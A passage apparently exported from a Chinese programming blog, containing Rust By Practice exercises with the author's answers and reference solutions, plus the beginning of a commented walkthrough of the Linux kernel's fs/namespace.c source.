0101 is &#123;:04b&#125;&quot;, 0b0011u32 ^ 0b0101); println!(&quot;1 &lt;&lt; 5 is &#123;&#125;&quot;, 1u32 &lt;&lt; 5); println!(&quot;0x80 &gt;&gt; 2 is 0x&#123;:x&#125;&quot;, 0x80u32 &gt;&gt; 2);&#125; Answer 12345678910111213141516171819202122232425fn main() &#123; // Integer addition assert!(1u32 + 2 == 3); // Integer subtraction assert!(1i32 - 2 == -1); assert!(1i8 - 2 == -1); assert!(3 * 50 == 150); assert!(9 / 3 == 3); // error ! make it work assert!(24 % 5 == 4); // Short-circuiting boolean logic assert!(true &amp;&amp; false == false); assert!(true || false == true); assert!(!true == false); // Bitwise operations println!(&quot;0011 AND 0101 is &#123;:04b&#125;&quot;, 0b0011u32 &amp; 0b0101); println!(&quot;0011 OR 0101 is &#123;:04b&#125;&quot;, 0b0011u32 | 0b0101); println!(&quot;0011 XOR 0101 is &#123;:04b&#125;&quot;, 0b0011u32 ^ 0b0101); println!(&quot;1 &lt;&lt; 5 is &#123;&#125;&quot;, 1u32 &lt;&lt; 5); println!(&quot;0x80 &gt;&gt; 2 is 0x&#123;:x&#125;&quot;, 0x80u32 &gt;&gt; 2);&#125; 字符、布尔、单元类型字符 🌟 123456789101112// 修改2处 `assert_eq!` 让代码工作use std::mem::size_of_val;fn main() &#123; let c1 = &#x27;a&#x27;; assert_eq!(size_of_val(&amp;c1),1); let c2 = &#x27;中&#x27;; assert_eq!(size_of_val(&amp;c2),3); println!(&quot;Success!&quot;)&#125; My Answer 123456789101112// 修改2处 `assert_eq!` 让代码工作use std::mem::size_of_val;fn main() &#123; let c1 = &#x27;a&#x27;; assert_eq!(size_of_val(&amp;c1),4); let c2 = &#x27;中&#x27;; assert_eq!(size_of_val(&amp;c2),4); println!(&quot;Success!&quot;)&#125; Answer 123456789use std::mem::size_of_val;fn main() &#123; let c1 = &#x27;a&#x27;; assert_eq!(size_of_val(&amp;c1), 4); let c2 = &#x27;中&#x27;; assert_eq!(size_of_val(&amp;c2), 4);&#125; 🌟 123456789// 修改一行让代码正常打印fn main() &#123; let c1 = &quot;中&quot;; print_char(c1);&#125; fn print_char(c : char) &#123; println!(&quot;&#123;&#125;&quot;, c);&#125; My Answer 123456789// 修改一行让代码正常打印fn main() &#123; let c1 = &quot;中&quot;; print_char(c1);&#125; fn print_char(c : &amp;str) &#123; println!(&quot;&#123;&#125;&quot;, c);&#125; Answer 12345678fn main() &#123; let c1 = &#x27;中&#x27;; print_char(c1);&#125;fn print_char(c: char) &#123; println!(&quot;&#123;&#125;&quot;, c);&#125; 布尔 🌟 123456789// 使成功打印fn main() &#123; let _f: bool = false; let t = true; if !t &#123; println!(&quot;Success!&quot;) &#125;&#125; My Answer 123456789// 使成功打印fn main() &#123; let _f: bool = false; let t = true; if t &#123; println!(&quot;Success!&quot;) &#125;&#125; Answer 12345678fn main() &#123; let _f: bool = false; let t = false; if !t &#123; println!(&quot;hello, world&quot;); &#125;&#125; 🌟 1234567fn main() &#123; let f = true; let t = true &amp;&amp; false; assert_eq!(t, f); println!(&quot;Success!&quot;)&#125; My Answer 1234567fn main() &#123; let f = true; let t = true || false; assert_eq!(t, f); println!(&quot;Success!&quot;)&#125; Answer 12345fn main() &#123; let f = true; let t = true || false; assert_eq!(t, f);&#125; 单元类型 🌟🌟 123456789101112131415161718// 让代码工作，但不要修改 `implicitly_ret_unit` !fn main() &#123; let _v: () = (); let v = (2, 3); assert_eq!(v, implicitly_ret_unit()); println!(&quot;Success!&quot;)&#125;fn implicitly_ret_unit() &#123; println!(&quot;I will return a ()&quot;)&#125;// 不要使用下面的函数，它只用于演示！fn explicitly_ret_unit() -&gt; () &#123; println!(&quot;I will return a ()&quot;)&#125; My Answer 123456789101112131415161718// 让代码工作，但不要修改 `implicitly_ret_unit` !fn main() &#123; let u: () = (); let _vv = (2, 3); assert_eq!(u, implicitly_ret_unit()); println!(&quot;Success!&quot;)&#125;fn implicitly_ret_unit() &#123; println!(&quot;I will return a ()&quot;)&#125;// 不要使用下面的函数，它只用于演示！fn explicitly_ret_unit() -&gt; () &#123; println!(&quot;I will return a ()&quot;)&#125; Answer 123456789101112131415fn main() &#123; let v0: () = (); let v = (2, 3); assert_eq!(v0, implicitly_ret_unit())&#125;fn implicitly_ret_unit() &#123; println!(&quot;I will return a ()&quot;)&#125;// don&#x27;t use this onefn explicitly_ret_unit() -&gt; () &#123; println!(&quot;I will return a ()&quot;)&#125; 🌟🌟 单元类型占用的内存大小是多少？ 12345678// 让代码工作：修改 `assert!` 中的 `4` use std::mem::size_of_val;fn main() &#123; let unit: () = (); assert!(size_of_val(&amp;unit) == 4); println!(&quot;Success!&quot;)&#125; My Answer 1 &#x2F;&#x2F; 让代码工作：修改 assert! 中的 4use std::mem::size_of_val;fn main() { let unit: () = (); assert!(size_of_val(&amp;unit) == 0); println!(&quot;Success!&quot;) } 1 Answer 1234567use std::mem::size_of_val;fn main() &#123; let unit: () = (); // unit type does&#x27;t occupy any memeory space assert!(size_of_val(&amp;unit) == 0);&#125; 语句和表达式示例1234567891011121314151617181920fn main() &#123; let x = 5u32; let y = &#123; let x_squared = x * x; let x_cube = x_squared * x; // 下面表达式的值将被赋给 `y` x_cube + x_squared + x &#125;; let z = &#123; // 分号让表达式变成了语句，因此返回的不再是表达式 `2 * x` 的值，而是语句的值 `()` 2 * x; &#125;; println!(&quot;x is &#123;:?&#125;&quot;, x); println!(&quot;y is &#123;:?&#125;&quot;, y); println!(&quot;z is &#123;:?&#125;&quot;, z);&#125; 练习 🌟🌟 123456789// 使用两种方法让代码工作起来fn main() &#123; let v = &#123; let mut x = 1; x += 2 &#125;; assert_eq!(v, 3);&#125; My Answer 123456789// 使用两种方法让代码工作起来fn main() &#123; let v = &#123; let mut x = 1; x += 2 &#125;; assert_eq!(v, ());&#125; 12345678910// 使用两种方法让代码工作起来fn main() &#123; let v = &#123; let mut x = 1; x += 2; x &#125;; assert_eq!(v, 3);&#125; Answer 12345678fn main() &#123; let v = &#123; let mut x = 1; x += 2 &#125;; assert_eq!(v, ()); &#125; 123456789fn main() &#123; let v = &#123; let mut x = 1; x += 2; x &#125;; assert_eq!(v, 3);&#125; 🌟 12345fn main() &#123; let v = (let x = 3); assert!(v == 3);&#125; My Answer 12345678fn main() &#123; let v = &#123; let x = 3; x &#125;; assert!(v == 3);&#125; Answer 12345678fn main() &#123; let v = &#123; let x = 3; x &#125;; assert!(v == 3);&#125; 🌟 12345678fn main() &#123; let s = sum(1 , 2); assert_eq!(s, 3);&#125;fn sum(x: i32, y: i32) -&gt; i32 &#123; x + y;&#125; My Answer 12345678fn main() &#123; let s = sum(1 , 2); assert_eq!(s, 3);&#125;fn sum(x: i32, y: i32) -&gt; i32 &#123; x + y&#125; Answer 12345678fn main() &#123; let s = sum(1 , 2); assert_eq!(s, 3);&#125;fn sum(x: i32, y: i32) -&gt; i32 &#123; x + y&#125; 函数 🌟🌟🌟 1234567891011fn main() &#123; // 不要修改下面两行代码! let (x, y) = (1, 2); let s = sum(x, y); assert_eq!(s, 3);&#125;fn sum(x, y: i32) &#123; x + y;&#125; My Answer 1234567891011fn main() &#123; // 不要修改下面两行代码! let (x, y) = (1, 2); let s = sum(x, y); assert_eq!(s, 3);&#125;fn sum(x : i32, y: i32) -&gt; i32&#123; x + y&#125; Answer 1234567891011fn main() &#123; // don&#x27;t modify the following two lines! let (x, y) = (1, 2); let s = sum(x, y); assert_eq!(s, 3);&#125;fn sum(x: i32, y: i32) -&gt; i32 &#123; x + y&#125; 🌟🌟 12345678fn main() &#123; print();&#125;// 使用另一个类型来替代 i32fn print() -&gt; i32 &#123; println!(&quot;hello,world&quot;);&#125; My Answer 12345678fn main() &#123; print();&#125;// 使用另一个类型来替代 i32fn print() -&gt; () &#123; println!(&quot;hello,world&quot;);&#125; Answer 12345678fn main() &#123; print();&#125;// replace i32 with another typefn print() -&gt; () &#123; println!(&quot;hello,world&quot;);&#125; 🌟🌟🌟 123456789// 用两种方法求解fn main() &#123; never_return();&#125;fn never_return() -&gt; ! &#123; // 实现这个函数，不要修改函数签名!&#125; My Answer 不会 Answer 12345678fn main() &#123; never_return();&#125;fn never_return() -&gt; ! &#123; // implement this function, don&#x27;t modify fn signatures panic!(&quot;I return nothing!&quot;)&#125; 🌟🌟 发散函数( Diverging function )不会返回任何值，因此它们可以用于替代需要返回任何值的地方 12345678910111213141516171819202122fn main() &#123; println!(&quot;Success!&quot;);&#125;fn get_option(tp: u8) -&gt; Option&lt;i32&gt; &#123; match tp &#123; 1 =&gt; &#123; // TODO &#125; _ =&gt; &#123; // TODO &#125; &#125;; // 这里与其返回一个 None，不如使用发散函数替代 never_return_fn()&#125;// 使用三种方法实现以下发散函数fn never_return_fn() -&gt; ! &#123;&#125; My Answer 不会 Answer 12345678910111213141516171819202122fn main() &#123; println!(&quot;Success!&quot;);&#125;fn get_option(tp: u8) -&gt; Option&lt;i32&gt; &#123; match tp &#123; 1 =&gt; &#123; // TODO &#125; _ =&gt; &#123; // TODO &#125; &#125;; never_return_fn()&#125;// IMPLEMENT this function// DON&#x27;T change any code elsefn never_return_fn() -&gt; ! &#123; unimplemented!()&#125; 1234// IMPLEMENT this function in THREE waysfn never_return_fn() -&gt; ! &#123; panic!()&#125; 1234// IMPLEMENT this function in THREE waysfn never_return_fn() -&gt; ! &#123; todo!();&#125; 123456// IMPLEMENT this function in THREE waysfn never_return_fn() -&gt; ! &#123; loop &#123; std::thread::sleep(std::time::Duration::from_secs(1)) &#125;&#125; 🌟🌟 123456789101112131415fn main() &#123; // 填空 let b = __; let _v = match b &#123; true =&gt; 1, // 发散函数也可以用于 `match` 表达式，用于替代任何类型的值 false =&gt; &#123; println!(&quot;Success!&quot;); panic!(&quot;we have no value for `false`, but we can panic&quot;) &#125; &#125;; println!(&quot;Exercise Failed if printing out this line!&quot;);&#125; My Answer 123456789101112131415fn main() &#123; // 填空 let b = true; let _v = match b &#123; true =&gt; 1, // 发散函数也可以用于 `match` 表达式，用于替代任何类型的值 false =&gt; &#123; println!(&quot;Success!&quot;); panic!(&quot;we have no value for `false`, but we can panic&quot;) &#125; &#125;; println!(&quot;Exercise Failed if printing out this line!&quot;);&#125; Answer 123456789101112131415fn main() &#123; // FILL in the blank let b = false; let _v = match b &#123; true =&gt; 1, // Diverging functions can also be used in match expression false =&gt; &#123; println!(&quot;Success!&quot;); panic!(&quot;we have no value for `false`, but we can panic&quot;) &#125; &#125;; println!(&quot;Exercise Failed if printing out this line!&quot;);&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"Rust学习 练习1 变量绑定与解构","slug":"Rust学习-练习1-变量绑定与解构","date":"2023-08-23T13:01:30.000Z","updated":"2023-09-11T13:11:33.952Z","comments":true,"path":"2023/08/23/Rust学习-练习1-变量绑定与解构/","link":"","permalink":"http://example.com/2023/08/23/Rust%E5%AD%A6%E4%B9%A0-%E7%BB%83%E4%B9%A01-%E5%8F%98%E9%87%8F%E7%BB%91%E5%AE%9A%E4%B8%8E%E8%A7%A3%E6%9E%84/","excerpt":"变量绑定与解构 - Rust By Practice( Rust 练习实践 ) 变量绑定与解构绑定与可变性","text":"变量绑定与解构 - Rust By Practice( Rust 练习实践 ) 变量绑定与解构绑定与可变性 🌟 变量只有在初始化后才能被使用 123456// 修复下面代码的错误并尽可能少的修改fn main() &#123; let x: i32; // 未初始化，但被使用 let y: i32; // 未初始化，也未被使用 println!(&quot;x is equal to &#123;&#125;&quot;, x); &#125; My Answer 123456// 修复下面代码的错误并尽可能少的修改fn main() &#123; let x: i32 = 10; // 未初始化，但被使用 let y: i32; // 未初始化，也未被使用 println!(&quot;&#123;&#125; is equal to 10&quot;, x); &#125; Answer 12345fn main() &#123; let x: i32 = 5; // unintialized but using, ERROR ! let y: i32; // uninitialized but also unusing, only warning println!(&quot;&#123;&#125; is equal to 5&quot;, x);&#125; -2. 🌟🌟 可以使用 mut 将变量标记为可变 1234567// 完形填空，让代码编译fn main() &#123; let __ = 1; __ += 2; println!(&quot;x = &#123;&#125;&quot;, x); &#125; My Answer 1234567// 完形填空，让代码编译fn main() &#123; let mut x = 1; x += 2; println!(&quot;x = &#123;&#125;&quot;, x); &#125; Answer 123456fn main() &#123; let mut x = 1; x += 2; println!(&quot;&#123;&#125; is equal to 3&quot;, x);&#125; 变量作用域 🌟 作用域是一个变量在程序中能够保持合法的范围 123456789// 修复下面代码的错误并使用尽可能少的改变fn main() &#123; let x: i32 = 10; &#123; let y: i32 = 5; println!(&quot;x 的值是 &#123;&#125;, y 的值是 &#123;&#125;&quot;, x, y); &#125; println!(&quot;x 的值是 &#123;&#125;, y 的值是 &#123;&#125;&quot;, x, y); &#125; My Answer 1234567891011// 修复下面代码的错误并使用尽可能少的改变fn main() &#123; let x: i32 = 10; let y: i32 = 10; &#123; let y: i32 = 5; let x: i32 = 5; println!(&quot;x 的值是 &#123;&#125;, y 的值是 &#123;&#125;&quot;, x, y); &#125; println!(&quot;x 的值是 &#123;&#125;, y 的值是 &#123;&#125;&quot;, x, y); &#125; Answer 123456789fn main() &#123; let x: i32 = 10; let y: i32 = 20; &#123; let y: i32 = 5; println!(&quot;The value of x is &#123;&#125; and value of y is &#123;&#125;&quot;, x, y); &#125; println!(&quot;The value of x is &#123;&#125; and value of y is &#123;&#125;&quot;, x, y); &#125; 🌟🌟 12345678// 修复错误fn main() &#123; println!(&quot;&#123;&#125;, world&quot;, x); &#125;fn define_x() &#123; let x = &quot;hello&quot;;&#125; My Answer 12345678910// 修复错误fn main() &#123; let x = define_x(); println!(&quot;&#123;&#125;, world&quot;, x); &#125;fn define_x() -&gt; String&#123; let x = &quot;hello&quot;.to_string(); x&#125; Answer 123456789fn main() &#123; let x = define_x(); println!(&quot;&#123;&#125;, world&quot;, x);&#125;fn define_x() -&gt; String &#123; let x = &quot;hello&quot;.to_string(); x&#125; 123456789fn main() &#123; let x = define_x(); println!(&quot;&#123;:?&#125;, world&quot;, x);&#125;fn define_x() -&gt; &amp;&#x27;static str &#123; let x = &quot;hello&quot;; x&#125; 变量遮蔽 🌟🌟 若后面的变量声明的名称和之前的变量相同，则我们说：第一个变量被第二个同名变量遮蔽了( shadowing ) 12345678910111213// 只允许修改 `assert_eq!` 来让 `println!` 工作(在终端输出 `42`)fn main() &#123; let x: i32 = 5; &#123; let x = 12; assert_eq!(x, 5); &#125; assert_eq!(x, 12); let x = 42; println!(&quot;&#123;&#125;&quot;, x); // 输出 &quot;42&quot;.&#125; My Answer 12345678910111213// 只允许修改 `assert_eq!` 来让 `println!` 工作(在终端输出 `42`)fn main() &#123; let x: i32 = 5; &#123; let x = 12; assert_eq!(x, 12); &#125; assert_eq!(x, 5); let x = 42; println!(&quot;&#123;&#125;&quot;, x); // 输出 &quot;42&quot;.&#125; Answer 123456789101112fn main() &#123; let x: i32 = 5; &#123; let x = 12; assert_eq!(x, 12); &#125; assert_eq!(x, 5); let x = 42; println!(&quot;&#123;&#125;&quot;, x); // Prints &quot;42&quot;.&#125; 🌟🌟 修改一行代码以通过编译 123456fn main() &#123; let mut x: i32 = 1; x = 7; // 遮蔽且再次绑定 let x = x; x += 3; let y = 4; // 遮蔽 let y = &quot;I can also be bound to text!&quot;; } 123456789101112131415- My Answer ```rust fn main() &#123; let mut x: i32 = 1; x = 7; // 遮蔽且再次绑定 let mut x = x; x += 3; let y = 4; // 遮蔽 let y = &quot;I can also be bound to text!&quot;; &#125; Answer 12345fn main() &#123; let mut x: i32 = 1; x = 7; // Shadowing and re-binding let x = x; let y = 4; // Shadowing let y = &quot;I can also be bound to text!&quot;; println!(&quot;Success!&quot;); } 未使用的变量 使用以下方法来修复编译器输出的 warning : 🌟 一种方法 🌟🌟 两种方法 12345fn main() &#123; let x = 1; &#125;// compiler warning: unused variable: `x` My Answer 123456fn main() &#123; let _x = 1; &#125;// compiler warning: unused variable: `x` Answer 1234#[allow(unused_variables)]fn main() &#123; let x = 1;&#125; 123fn main() &#123; let _x = 1;&#125; 变量解构 🌟🌟 我们可以将 let 跟一个模式一起使用来解构一个元组，最终将它解构为多个独立的变量 提示: 可以使用变量遮蔽或可变性 12345678// 修复下面代码的错误并尽可能少的修改fn main() &#123; let (x, y) = (1, 2); x += 2; assert_eq!(x, 3); assert_eq!(y, 2);&#125; My Answer 12345678// 修复下面代码的错误并尽可能少的修改fn main() &#123; let (mut x, y) = (1, 2); x += 2; assert_eq!(x, 3); assert_eq!(y, 2);&#125; Answer 1234567fn main() &#123; let (mut x, y) = (1, 2); x += 2; assert_eq!(x, 3); assert_eq!(y, 2);&#125; 1234567fn main() &#123; let (x, y) = (1, 2); let x = 3; assert_eq!(x, 3); assert_eq!(y, 2);&#125; 解构式赋值该功能于 Rust 1.59 版本引入：你可以在赋值语句的左式中使用元组、切片或结构体进行匹配赋值。 🌟🌟 1234567fn main() &#123; let (x, y); (x,..) = (3, 4); [.., y] = [1, 2]; // 填空，让代码工作 assert_eq!([x,y], __);&#125; My Answer 1234567fn main() &#123; let (x, y); (x,..) = (3, 4); [.., y] = [1, 2]; // 填空，让代码工作 assert_eq!([x,y], [3,2]);&#125; Answer 1234567fn main() &#123; let (x, y); (x, ..) = (3, 4); [.., y] = [1, 2]; // fill the blank to make the code work assert_eq!([x, y], [3, 2]);&#125;","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"Rust","slug":"编程语言/Rust","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/"},{"name":"练习实践","slug":"编程语言/Rust/练习实践","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Rust/%E7%BB%83%E4%B9%A0%E5%AE%9E%E8%B7%B5/"}],"tags":[{"name":"Rust","slug":"Rust","permalink":"http://example.com/tags/Rust/"}]},{"title":"学习 Linux fs/namespace.c源码分析","slug":"学习-Linux-fs-namespace-c源码分析","date":"2023-08-17T04:46:51.000Z","updated":"2024-01-10T02:18:04.661Z","comments":true,"path":"2023/08/17/学习-Linux-fs-namespace-c源码分析/","link":"","permalink":"http://example.com/2023/08/17/%E5%AD%A6%E4%B9%A0-Linux-fs-namespace-c%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/","excerpt":"12345678910111213141516171819202122232425262728293031323334353637// SPDX-License-Identifier: GPL-2.0-only/* * linux/fs/namespace.c * * (C) Copyright Al Viro 2000, 2001 * * Based on code from fs/super.c, copyright Linus Torvalds and others. * Heavily rewritten. */#include &lt;linux/syscalls.h&gt;#include &lt;linux/export.h&gt;#include &lt;linux/capability.h&gt;#include &lt;linux/mnt_namespace.h&gt;#include &lt;linux/user_namespace.h&gt;#include &lt;linux/namei.h&gt;#include &lt;linux/security.h&gt;#include &lt;linux/cred.h&gt;#include &lt;linux/idr.h&gt;#include &lt;linux/init.h&gt; /* init_rootfs */#include &lt;linux/fs_struct.h&gt; /* get_fs_root et.al. */#include &lt;linux/fsnotify.h&gt; /* fsnotify_vfsmount_delete */#include &lt;linux/file.h&gt;#include &lt;linux/uaccess.h&gt;#include &lt;linux/proc_ns.h&gt;#include &lt;linux/magic.h&gt;#include &lt;linux/memblock.h&gt;#include &lt;linux/proc_fs.h&gt;#include &lt;linux/task_work.h&gt;#include &lt;linux/sched/task.h&gt;#include &lt;uapi/linux/mount.h&gt;#include &lt;linux/fs_context.h&gt;#include &lt;linux/shmem_fs.h&gt;#include &lt;linux/mnt_idmapping.h&gt;#include &quot;pnode.h&quot;#include &quot;internal.h&quot; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/* Maximum number of mounts in a mount namespace */static unsigned int sysctl_mount_max __read_mostly = 100000;static unsigned int m_hash_mask __read_mostly;static unsigned int m_hash_shift __read_mostly;static unsigned int mp_hash_mask __read_mostly;static unsigned int mp_hash_shift __read_mostly;static __initdata unsigned long mhash_entries;// 设置mhash_entries的值static int __init set_mhash_entries(char *str)&#123; if (!str) return 0; mhash_entries = simple_strtoul(str, &amp;str, 0); return 1;&#125;// 在内核启动时设置mhash_entries的值__setup(&quot;mhash_entries=&quot;, set_mhash_entries);static __initdata unsigned long mphash_entries;// 设置mphash_entries的值static int __init set_mphash_entries(char *str)&#123; if (!str) return 0; mphash_entries = simple_strtoul(str, &amp;str, 0); return 1;&#125;// 在内核启动时设置mphash_entries的值__setup(&quot;mphash_entries=&quot;, set_mphash_entries);static u64 event;static DEFINE_IDA(mnt_id_ida); // 挂载点ID分配器static DEFINE_IDA(mnt_group_ida); // 挂载组ID分配器static struct hlist_head *mount_hashtable __read_mostly; // 挂载点哈希表static struct hlist_head *mountpoint_hashtable __read_mostly; // 挂载目录哈希表static struct kmem_cache *mnt_cache __read_mostly; // 挂载结构体的SLAB缓存static DECLARE_RWSEM(namespace_sem); // 命名空间信号量static HLIST_HEAD(unmounted); /* 未挂载的挂载点链表，由namespace_sem保护 */static LIST_HEAD(ex_mountpoints); /* 已存在的挂载目录链表，由namespace_sem保护 */ 123456789101112131415161718192021222324252627282930313233struct mount_kattr &#123; unsigned int attr_set; // 挂载属性设置 unsigned int attr_clr; // 挂载属性清除 unsigned int propagation; // 挂载传播标志 unsigned int lookup_flags; // 挂载点查找标志 bool recurse; // 是否递归 struct user_namespace *mnt_userns; // 挂载的用户命名空间 struct mnt_idmap *mnt_idmap; // 挂载的ID映射&#125;;/* /sys/fs */struct kobject *fs_kobj; // 文件系统的内核对象/* * vfsmount锁可能被以读模式获取，以防止对vfsmount哈希表的更改， * 例如在挂载点查找或向上遍历树时。 * * 在所有修改vfsmount树或哈希表的情况下，或者在修改vfsmount结构体时， * 应以写模式获取该锁。 */__cacheline_aligned_in_smp DEFINE_SEQLOCK(mount_lock); // vfsmount锁// 获取mount_lock写锁的辅助函数static inline void lock_mount_hash(void)&#123; write_seqlock(&amp;mount_lock);&#125;// 释放mount_lock写锁的辅助函数static inline void unlock_mount_hash(void)&#123; write_sequnlock(&amp;mount_lock);&#125;","text":"12345678910111213141516171819202122232425262728293031323334353637// SPDX-License-Identifier: GPL-2.0-only/* * linux/fs/namespace.c * * (C) Copyright Al Viro 2000, 2001 * * Based on code from fs/super.c, copyright Linus Torvalds and others. * Heavily rewritten. */#include &lt;linux/syscalls.h&gt;#include &lt;linux/export.h&gt;#include &lt;linux/capability.h&gt;#include &lt;linux/mnt_namespace.h&gt;#include &lt;linux/user_namespace.h&gt;#include &lt;linux/namei.h&gt;#include &lt;linux/security.h&gt;#include &lt;linux/cred.h&gt;#include &lt;linux/idr.h&gt;#include &lt;linux/init.h&gt; /* init_rootfs */#include &lt;linux/fs_struct.h&gt; /* get_fs_root et.al. */#include &lt;linux/fsnotify.h&gt; /* fsnotify_vfsmount_delete */#include &lt;linux/file.h&gt;#include &lt;linux/uaccess.h&gt;#include &lt;linux/proc_ns.h&gt;#include &lt;linux/magic.h&gt;#include &lt;linux/memblock.h&gt;#include &lt;linux/proc_fs.h&gt;#include &lt;linux/task_work.h&gt;#include &lt;linux/sched/task.h&gt;#include &lt;uapi/linux/mount.h&gt;#include &lt;linux/fs_context.h&gt;#include &lt;linux/shmem_fs.h&gt;#include &lt;linux/mnt_idmapping.h&gt;#include &quot;pnode.h&quot;#include &quot;internal.h&quot; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/* Maximum number of mounts in a mount namespace */static unsigned int sysctl_mount_max __read_mostly = 100000;static unsigned int m_hash_mask __read_mostly;static unsigned int m_hash_shift __read_mostly;static unsigned int mp_hash_mask __read_mostly;static unsigned int mp_hash_shift __read_mostly;static __initdata unsigned long mhash_entries;// 设置mhash_entries的值static int __init set_mhash_entries(char *str)&#123; if (!str) return 0; mhash_entries = simple_strtoul(str, &amp;str, 0); return 1;&#125;// 在内核启动时设置mhash_entries的值__setup(&quot;mhash_entries=&quot;, set_mhash_entries);static __initdata unsigned long mphash_entries;// 设置mphash_entries的值static int __init set_mphash_entries(char *str)&#123; if (!str) return 0; mphash_entries = simple_strtoul(str, &amp;str, 0); return 1;&#125;// 在内核启动时设置mphash_entries的值__setup(&quot;mphash_entries=&quot;, set_mphash_entries);static u64 event;static DEFINE_IDA(mnt_id_ida); // 挂载点ID分配器static DEFINE_IDA(mnt_group_ida); // 挂载组ID分配器static struct hlist_head *mount_hashtable __read_mostly; // 挂载点哈希表static struct hlist_head *mountpoint_hashtable __read_mostly; // 挂载目录哈希表static struct kmem_cache *mnt_cache __read_mostly; // 挂载结构体的SLAB缓存static DECLARE_RWSEM(namespace_sem); // 命名空间信号量static HLIST_HEAD(unmounted); /* 未挂载的挂载点链表，由namespace_sem保护 */static LIST_HEAD(ex_mountpoints); /* 已存在的挂载目录链表，由namespace_sem保护 */ 123456789101112131415161718192021222324252627282930313233struct mount_kattr &#123; unsigned int attr_set; // 挂载属性设置 unsigned int attr_clr; // 挂载属性清除 unsigned int propagation; // 挂载传播标志 unsigned int lookup_flags; // 挂载点查找标志 bool recurse; // 是否递归 struct user_namespace *mnt_userns; // 挂载的用户命名空间 struct mnt_idmap *mnt_idmap; // 挂载的ID映射&#125;;/* /sys/fs */struct kobject *fs_kobj; // 文件系统的内核对象/* * vfsmount锁可能被以读模式获取，以防止对vfsmount哈希表的更改， * 例如在挂载点查找或向上遍历树时。 * * 在所有修改vfsmount树或哈希表的情况下，或者在修改vfsmount结构体时， * 应以写模式获取该锁。 */__cacheline_aligned_in_smp DEFINE_SEQLOCK(mount_lock); // vfsmount锁// 获取mount_lock写锁的辅助函数static inline void lock_mount_hash(void)&#123; write_seqlock(&amp;mount_lock);&#125;// 释放mount_lock写锁的辅助函数static inline void unlock_mount_hash(void)&#123; write_sequnlock(&amp;mount_lock);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051static inline struct hlist_head *m_hash(struct vfsmount *mnt, struct dentry *dentry)&#123; // 计算哈希值 unsigned long tmp = ((unsigned long)mnt / L1_CACHE_BYTES); tmp += ((unsigned long)dentry / L1_CACHE_BYTES); tmp = tmp + (tmp &gt;&gt; m_hash_shift); // 返回哈希表中的头节点 return &amp;mount_hashtable[tmp &amp; m_hash_mask];&#125;static inline struct hlist_head *mp_hash(struct dentry *dentry)&#123; // 计算哈希值 unsigned long tmp = ((unsigned long)dentry / L1_CACHE_BYTES); tmp = tmp + (tmp &gt;&gt; mp_hash_shift); // 返回哈希表中的头节点 return &amp;mountpoint_hashtable[tmp &amp; mp_hash_mask];&#125;static int mnt_alloc_id(struct mount *mnt)&#123; // 分配一个新的挂载点ID int res = ida_alloc(&amp;mnt_id_ida, GFP_KERNEL); if (res &lt; 0) return res; // 将分配的ID赋值给挂载点结构体 mnt-&gt;mnt_id = res; return 0;&#125;static void mnt_free_id(struct mount *mnt)&#123; // 释放挂载点ID ida_free(&amp;mnt_id_ida, mnt-&gt;mnt_id);&#125;/* * 分配一个新的对等组ID */static int mnt_alloc_group_id(struct mount *mnt)&#123; // 分配一个最小的对等组ID int res = ida_alloc_min(&amp;mnt_group_ida, 1, GFP_KERNEL); if (res &lt; 0) return res; // 将分配的ID赋值给挂载点结构体 mnt-&gt;mnt_group_id = res; return 0;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162static struct mount *alloc_vfsmnt(const char *name)&#123; // 分配一个新的挂载点结构体 struct mount *mnt = kmem_cache_zalloc(mnt_cache, GFP_KERNEL); if (mnt) &#123; int err; // 分配一个新的挂载点ID err = mnt_alloc_id(mnt); if (err) goto out_free_cache; if (name) &#123; // 复制设备名称到mnt_devname mnt-&gt;mnt_devname = kstrdup_const(name, GFP_KERNEL_ACCOUNT); if (!mnt-&gt;mnt_devname) goto out_free_id; &#125;#ifdef CONFIG_SMP // 为mnt_pcp分配percpu变量 mnt-&gt;mnt_pcp = alloc_percpu(struct mnt_pcp); if (!mnt-&gt;mnt_pcp) goto out_free_devname; // 在本地CPU变量中增加mnt_count this_cpu_add(mnt-&gt;mnt_pcp-&gt;mnt_count, 1);#else // 设置mnt_count和mnt_writers mnt-&gt;mnt_count = 1; mnt-&gt;mnt_writers = 0;#endif // 初始化mnt_hash、mnt_child、mnt_mounts、mnt_list、mnt_expire、mnt_share、mnt_slave_list、mnt_slave、mnt_mp_list、mnt_umounting、mnt_stuck_children INIT_HLIST_NODE(&amp;mnt-&gt;mnt_hash); INIT_LIST_HEAD(&amp;mnt-&gt;mnt_child); INIT_LIST_HEAD(&amp;mnt-&gt;mnt_mounts); INIT_LIST_HEAD(&amp;mnt-&gt;mnt_list); INIT_LIST_HEAD(&amp;mnt-&gt;mnt_expire); INIT_LIST_HEAD(&amp;mnt-&gt;mnt_share); INIT_LIST_HEAD(&amp;mnt-&gt;mnt_slave_list); INIT_LIST_HEAD(&amp;mnt-&gt;mnt_slave); INIT_HLIST_NODE(&amp;mnt-&gt;mnt_mp_list); INIT_LIST_HEAD(&amp;mnt-&gt;mnt_umounting); INIT_HLIST_HEAD(&amp;mnt-&gt;mnt_stuck_children); mnt-&gt;mnt.mnt_idmap = &amp;nop_mnt_idmap; &#125; return mnt;#ifdef CONFIG_SMPout_free_devname: // 释放mnt_devname的内存 